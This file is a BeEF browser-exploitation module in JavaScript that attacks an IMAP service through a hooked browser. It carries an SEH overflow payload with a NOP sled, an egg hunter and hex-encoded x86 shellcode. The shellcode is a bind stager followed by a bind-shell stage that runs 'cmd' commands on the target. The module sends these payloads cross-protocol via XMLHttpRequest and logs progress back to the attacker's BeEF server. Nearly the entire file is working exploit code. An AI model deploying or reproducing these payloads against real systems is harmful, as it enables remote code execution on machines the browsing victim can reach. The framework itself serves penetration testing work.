//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function () {
    var rhost = '<%= @rhost %>';
    var rport = '<%= @rport %>';
    var service_port = '<%= @service_port %>';
    var path = '<%= @path %>';
    var delay = parseInt('<%= @delay %>');

    var beef_host = '<%= @beef_host %>';
    var beef_port = '<%= @beef_port %>';
    var beef_proto = beef.net.httpproto;
    var beef_junk_port = '<%= @beef_junk_port %>';
//    var sock_name = '<%= @beef_junk_socket %>';

    //todo: this will be obviously dynamic as soon as we'll have more IPEC exploits.
    var available_space = 769;

    // base64 decode function that works properly with binary data (like shellcode)
    var Base64Binary = {
        _keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

        decode:function (input) {
            //get last chars to see if are valid
            var lkey1 = this._keyStr.indexOf(input.charAt(input.length - 1));
            var lkey2 = this._keyStr.indexOf(input.charAt(input.length - 1));

            var bytes = Math.ceil((3 * input.length) / 4.0);
            /**
             if (lkey1 == 64) bytes--; //padding chars, so skip
             if (lkey2 == 64) bytes--; //padding chars, so skip
             **/

            var uarray = [];
            var chr1, chr2, chr3;
            var enc1, enc2, enc3, enc4;
            var i = 0;
            var j = 0;

            input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

            for (i = 0; i < bytes; i += 3) {
                //get the 3 octects in 4 ascii chars
                enc1 = this._keyStr.indexOf(input.charAt(j++));
                enc2 = this._keyStr.indexOf(input.charAt(j++));
                enc3 = this._keyStr.indexOf(input.charAt(j++));
                enc4 = this._keyStr.indexOf(input.charAt(j++));

                chr1 = (enc1 << 2) | (enc2 >> 4);
                chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                chr3 = ((enc3 & 3) << 6) | enc4;

                uarray.push(chr1 & 0xff);
                if (enc3 != 64) uarray.push(chr2 & 0xff);
                if (enc4 != 64) uarray.push(chr3 & 0xff);
            }
            return uarray;
        }
    };


    /*
     * Ty's goodness. Slightly modified BeEF bind stager to work with the
     * Egg Hunter.
     *
     * Original size: 299 bytes
     * Final size: 326 bytes
     * BadChars removed: \x00\x0a\x0d\x20\x7b
     */
    var stager = "B33FB33F" + 
        "\xba\x6a\x99\xf8\x25\xd9\xcc\xd9\x74\x24\xf4\x5e\x31\xc9" +
        "\xb1\x4b\x83\xc6\x04\x31\x56\x11\x03\x56\x11\xe2\x9f\x65" +
        "\x10\xac\x5f\x96\xe1\xcf\xd6\x73\xd0\xdd\x8c\xf0\x41\xd2" +
        "\xc7\x55\x6a\x99\x85\x4d\xf9\xef\x01\x61\x4a\x45\x77\x4c" +
        "\x4b\x6b\xb7\x02\x8f\xed\x4b\x59\xdc\xcd\x72\x92\x11\x0f" +
        "\xb3\xcf\xda\x5d\x6c\x9b\x49\x72\x19\xd9\x51\x73\xcd\x55" +
        "\xe9\x0b\x68\xa9\x9e\xa1\x73\xfa\x0f\xbd\x3b\xe2\x24\x99" +
        "\x9b\x13\xe8\xf9\xe7\x5a\x85\xca\x9c\x5c\x4f\x03\x5d\x6f" +
        "\xaf\xc8\x60\x5f\x22\x10\xa5\x58\xdd\x67\xdd\x9a\x60\x70" +
        "\x26\xe0\xbe\xf5\xba\x42\x34\xad\x1e\x72\x99\x28\xd5\x78" +
        "\x56\x3e\xb1\x9c\x69\x93\xca\x99\xe2\x12\x1c\x28\xb0\x30" +
        "\xb8\x70\x62\x58\x99\xdc\xc5\x65\xf9\xb9\xba\xc3\x72\x2b" +
        "\xae\x72\xd9\x24\x03\x49\xe1\xb4\x0b\xda\x92\x86\x94\x70" +
        "\x3c\xab\x5d\x5f\xbb\xcc\x77\x27\x53\x33\x78\x58\x7a\xf0" +
        "\x2c\x08\x14\xd1\x4c\xc3\xe4\xde\x98\x44\xb4\x70\x73\x25" +
        "\x64\x31\x23\xcd\x6e\xbe\x1c\xed\x91\x14\x35\xdf\xb6\xc4" +
        "\x52\x22\x48\xfa\xfe\xab\xae\x96\xee\xfd\x79\x0f\xcd\xd9" +
        "\xb2\xa8\x2e\x08\xef\x61\xb9\x04\xe6\xb6\xc6\x94\x2d\x95" +
        "\x6b\x3c\xa5\x6e\x60\xf9\xd4\x70\xad\xa9\x81\xe7\x3b\x38" +
        "\xe0\x96\x3c\x11\x41\x58\xd3\x9a\xb5\x33\x93\xc9\xe6\xa9" +
        "\x13\x86\x50\x8a\x47\xb3\x9f\x07\xee\xfd\x35\xa8\xa2\x51" +
        "\x9e\xc0\x46\x8b\xe8\x4e\xb8\xfe\xbf\x18\x80\x97\xb8\x8b" +
        "\xf3\x4d\x47\x15\x6f\x03\x23\x57\x1b\xd8\xed\x4c\x16\x5d" +
        "\x37\x96\x26\x84";

    /*
     * Ty's goodness. Original BeEF bind stage.
     *
     * Original size: 792 bytes
     */
    var stage_allow_origin =
        "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28" +
            "\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52" +
            "\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b" +
            "\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38" +
            "\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58" +
            "\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a" +
            "\x8b\x12\xeb\x86\x5d\xbb\x00\x10\x00\x00\x6a\x40\x53\x53\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5" +
            "\x89\xc6\x68\x01\x00\x00\x00\x68\x00\x00\x00\x00\x68\x0c\x00\x00\x00\x68\x00\x00\x00\x00\x89" +
            "\xe3\x68\x00\x00\x00\x00\x89\xe1\x68\x00\x00\x00\x00\x8d\x7c\x24\x0c\x57\x53\x51\x68\x3e\xcf" +
            "\xaf\x0e\xff\xd5\x68\x00\x00\x00\x00\x89\xe3\x68\x00\x00\x00\x00\x89\xe1\x68\x00\x00\x00\x00" +
            "\x8d\x7c\x24\x14\x57\x53\x51\x68\x3e\xcf\xaf\x0e\xff\xd5\x8b\x5c\x24\x08\x68\x00\x00\x00\x00" +
            "\x68\x01\x00\x00\x00\x53\x68\xca\x13\xd3\x1c\xff\xd5\x8b\x5c\x24\x04\x68\x00\x00\x00\x00\x68" +
            "\x01\x00\x00\x00\x53\x68\xca\x13\xd3\x1c\xff\xd5\x89\xf7\x68\x63\x6d\x64\x00\x89\xe3\xff\x74" +
            "\x24\x10\xff\x74\x24\x14\xff\x74\x24\x0c\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c" +
            "\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79" +
            "\xcc\x3f\x86\xff\xd5\x89\xfe\xb9\xf8\x0f\x00\x00\x8d\x46\x08\xc6\x00\x00\x40\xe2\xfa\x56\x8d" +
            "\xbe\x18\x04\x00\x00\xe8\x62\x00\x00\x00\x48\x54\x54\x50\x2f\x31\x2e\x31\x20\x32\x30\x30\x20" +
            "\x4f\x4b\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x74\x65\x78\x74\x2f" +
            "\x68\x74\x6d\x6c\x0d\x0a\x41\x63\x63\x65\x73\x73\x2d\x43\x6f\x6e\x74\x72\x6f\x6c\x2d\x41\x6c" +
            "\x6c\x6f\x77\x2d\x4f\x72\x69\x67\x69\x6e\x3a\x20\x2a\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d" +
            "\x4c\x65\x6e\x67\x74\x68\x3a\x20\x33\x30\x31\x36\x0d\x0a\x0d\x0a\x5e\xb9\x62\x00\x00\x00\xf3" +
            "\xa4\x5e\x56\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90" +
            "\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68" +
            "\xea\x0f\xdf\xe0\xff\xd5\x97\x31\xdb\x53\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\xc2" +
            "\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff\xd5\x53\x53\x57\x68\x74\xec\x3b\xe1\xff" +
            "\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x81\xc4\xa0\x01\x00\x00\x5e\x89\x3e\x6a\x00\x68\x00" +
            "\x04\x00\x00\x89\xf3\x81\xc3\x08\x00\x00\x00\x53\xff\x36\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x54" +
            "\x24\x64\xb9\x00\x04\x00\x00\x81\x3b\x63\x6d\x64\x3d\x74\x06\x43\x49\xe3\x3a\xeb\xf2\x81\xc3" +
            "\x03\x00\x00\x00\x43\x53\x68\x00\x00\x00\x00\x8d\xbe\x10\x04\x00\x00\x57\x68\x01\x00\x00\x00" +
            "\x53\x8b\x5c\x24\x70\x53\x68\x2d\x57\xae\x5b\xff\xd5\x5b\x80\x3b\x0a\x75\xda\x68\xe8\x03\x00" +
            "\x00\x68\x44\xf0\x35\xe0\xff\xd5\x31\xc0\x50\x8d\x5e\x04\x53\x50\x50\x50\x8d\x5c\x24\x74\x8b" +
            "\x1b\x53\x68\x18\xb7\x3c\xb3\xff\xd5\x85\xc0\x74\x44\x8b\x46\x04\x85\xc0\x74\x3d\x68\x00\x00" +
            "\x00\x00\x8d\xbe\x14\x04\x00\x00\x57\x68\x86\x0b\x00\x00\x8d\xbe\x7a\x04\x00\x00\x57\x8d\x5c" +
            "\x24\x70\x8b\x1b\x53\x68\xad\x9e\x5f\xbb\xff\xd5\x6a\x00\x68\xe8\x0b\x00\x00\x8d\xbe\x18\x04" +
            "\x00\x00\x57\xff\x36\x68\xc2\xeb\x38\x5f\xff\xd5\xff\x36\x68\xc6\x96\x87\x52\xff\xd5\xe9\x38" +
            "\xfe\xff\xff";

    // Skape's NtDisplayString egghunter technique, 32 bytes -> see also string T00W inside
    /*
     * Egg Hunter (Skape's NtDisplayString technique).
     * Original size: 32 bytes
     *
     * Next SEH and SEH pointers
     * Size: 8 bytes
     */
    var egg_hunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74" +
                     "\xef\xb8\x42\x33\x33\x46\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7";
    var next_seh   = "\xeb\x06\x90\x90";
    var seh        = "\x4e\x3b\x01\x10";


    gen_nops = function(count){
        var i = 0;
        var result = "";
        while(i < count ){ result += "\x90";i++;}
        log("gen_nops: generated " + result.length + " nops.");
        return result;
    };

    /*
     * send_stager_back():
     * In order to properly calculate the exact size of the cross-domain request headers,
     * we send a bogus request back to BeEF (different port, so still cross-domain).
     *
     * get_junk_size():
     * Then we retrieve the total size of the HTTP headers, as well as other specific headers like 'Host'
     *
     * calc_junk_size():
     * Calculate the differences with the request that will be sent to the target, for example:
     * "Host: 172.16.67.1:2000\r\n"    //24 bytes
     * "Host: 172.16.67.135:143\r\n"   //25 bytes
     */
    send_stager_back = function(){
        var uri = "http://" + beef_host + ":" + beef_junk_port + "/";
        var xhr = new XMLHttpRequest();
        xhr.open("POST", uri, true);
        xhr.setRequestHeader("Content-Type", "text/plain");
        xhr.setRequestHeader('Accept','*/*');
        xhr.setRequestHeader("Accept-Language", "en");
        xhr.send("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
        log("send_stager_back: sending back the stager to calculate headers size");
    };

    var timeout_counter = 0;
    var timeout = 10;
    var size,host,contenttype,referer,nops = null;
    get_junk_size = function(){
        var junk_name = "";
        var uri = beef_proto + "://" + beef_host + ":" + beef_port + "/api/ipec/junk/" + sock_name;

        $j.ajax({
            type: "GET",
            url: uri,
            dataType: "json",
            success: function(data, textStatus, xhr){
                size = data.size;
                host = data.host;
                contenttype = data.contenttype;
                referer = data.referer;

                //todo to it better
                nops = data.nops;

                log("get_junk_size: OK - size [" + size + "] - host [" +
                    host + "] - contenttype [" + contenttype + "] - referer [" + referer + "]");
            },
            error: function(jqXHR, textStatus, errorThrown){
                timeout_counter++;
                // re-tries for 10 times (10 seconds)
                if (timeout_counter < timeout) {
                    log("get_junk_size: ERROR - no data yet. re-trying.");
                    setTimeout(function() {get_junk_size()},1000);
                }else{
                    log("get_junk_size: ERROR - timeout reached. giving up.");
                }
            }
        });

    };

    var final_junk_size = null;
    calc_junk_size = function(){

        final_junk_size = size;
        // 8 -> Host: \r\n
        var new_host = (rhost+":"+service_port).length + 8;
        if(new_host != host){

            if(new_host > host){
                var diff = new_host - host;
                final_junk_size += diff;
            }else{
                var diff = host - new_host;
                final_junk_size -= diff;
            }
        }
        log("get_junk_size: final_junk_size -> [" + final_junk_size + "]");

        //content-type "; charset=UTF-8" will not be present at the end, in the new request - we save 15 bytes
        if(contenttype > 26)
            final_junk_size -= 15;

        // referrer should be the same
        // we can also override the UserAgent (deliovering the Firefox Extension). We can then save 90 bytes or more.
        log("get_junk_size: final_junk_size -> [" + final_junk_size + "]");
    };

    var stager_successfull = false;
    send_stager = function(){

        try{
            xhr = new XMLHttpRequest();
            var uri = "http://" + rhost + ":" + service_port + path;
            log("send_stager: URI " + uri);
            xhr.open("POST", uri, true);
            xhr.setRequestHeader("Content-Type", "text/plain");

            //todo: if for some reasons the headers are too big (bigger than 425 bytes),
            // a warning should be displayed, because the exploit will not work, given the
            // space for the shellcode that we have.
            // The likelihood of this can be minimized thanks to the Firefox Extension we deliver
            // to disable PortBanning. We are also overriding the UserAgent, so we save up to 100 bytes of space.

            var junk = available_space - stager.length - final_junk_size; // 22 bytes
            var junk_data = gen_nops(junk);

            var payload = junk_data + stager + next_seh + seh + egg_hunter;
            var decoded_payload = Base64Binary.decode(btoa(payload));

            var c = "";
            for (var i = 0; i < decoded_payload.length; i++) {
                c += String.fromCharCode(decoded_payload[i] & 0xff);
            }

            //needed to have the service replying before sending the actual exploit
            xhr.open("POST", uri, true);
            xhr.setRequestHeader("Content-Type", "text/plain");
            xhr.setRequestHeader('Accept','*/*');
            xhr.setRequestHeader("Accept-Language", "en");
            xhr.send("a001 LIST \r\n");
            // / needed to have the service replying before sending the actual exploit

            xhr.open("POST", uri, true);
            xhr.setRequestHeader("Content-Type", "text/plain");
            xhr.setRequestHeader('Accept','*/*');
            xhr.setRequestHeader("Accept-Language", "en");

            var post_body = "a001 LIST " + "}" + c + "}" + "\r\n";

            log("send_stager: Final body length [" + post_body.length + "]");

            // this is required only with WebKit browsers.
            if (typeof XMLHttpRequest.prototype.sendAsBinary == 'undefined' && Uint8Array) {
                beef.debug("WebKit browser: Patched XmlHttpRequest to support sendAsBinary.");
                XMLHttpRequest.prototype.sendAsBinary = function(datastr) {
                    function byteValue(x) {
                        return x.charCodeAt(0) & 0xff;
                    }
                    var ords = Array.prototype.map.call(datastr, byteValue);
                    var ui8a = new Uint8Array(ords);
                    this.send(ui8a.buffer);
                }
            }

            xhr.sendAsBinary(post_body);
            log("send_stager: stager sent.");
            stager_successfull = true;
        }catch(exception){
            beef.debug("!!! Exception: " + exception);
            // Check for PortBanning exceptions:
            //NS_ERROR_PORT_ACCESS_NOT_ALLOWED: Establishing a connection to an unsafe or otherwise banned port was prohibited
            if(exception.toString().indexOf('NS_ERROR_PORT_ACCESS_NOT_ALLOWED') != -1){
                // not exactly needed but just in case
                stager_successfull =  false;
                log("Error: NS_ERROR_PORT_ACCESS_NOT_ALLOWED. Looks like PortBanning for port [" + service_port + "] is still enabled!");
            }
        }

    };

    deploy_stage = function () {
            // As soon as the stage is running, the HTTP responses will contain Access-Control-Allow-Origin: *
            // so we can communicate with CORS normally.
            var decoded_shellcode = Base64Binary.decode(btoa(stage_allow_origin));
            var c = "";
            for (var i = 0; i < decoded_shellcode.length; i++) {
                c += String.fromCharCode(decoded_shellcode[i] & 0xff);
            }
            var post_body = "cmd=" + c;
            var uri = "http://" + rhost + ":" + rport + path;

            xhr = new XMLHttpRequest();
            beef.debug("uri: " + uri);
            xhr.open("POST", uri, true);
            xhr.setRequestHeader("Content-Type", "text/plain");

            // this is required only with WebKit browsers.
            if (typeof XMLHttpRequest.prototype.sendAsBinary == 'undefined' && Uint8Array) {
                beef.debug("WebKit browser: Patched XmlHttpRequest to support sendAsBinary.");
                XMLHttpRequest.prototype.sendAsBinary = function(datastr) {
                    function byteValue(x) {
                        return x.charCodeAt(0) & 0xff;
                    }
                    var ords = Array.prototype.map.call(datastr, byteValue);
                    var ui8a = new Uint8Array(ords);
                    this.send(ui8a.buffer);
                }
            }

            xhr.sendAsBinary(post_body);
            log("deploy_stage: stage sent.\r\n You should be now able to use beef_bind_shell module to send commands.");


    };

    log = function(data){
        beef.net.send("<%= @command_url %>", <%= @command_id %>, data);
        beef.debug(data);
    };


/*
* To calculate exact HTTP header size we send a request back to BeEF, on a different socket, to maintain
* the cross-domain behavior.
*/
send_stager_back();

/*
* Deliver Stager and Stage.
*
* The following timeouts should be enough with normal DSL lines.
* Increase delay value for slower clients.
*/
setTimeout("get_junk_size()", delay/2);
setTimeout("calc_junk_size()", delay);
setTimeout("send_stager()", 2000 + delay);
setTimeout("deploy_stage()", 6000 + delay);

});
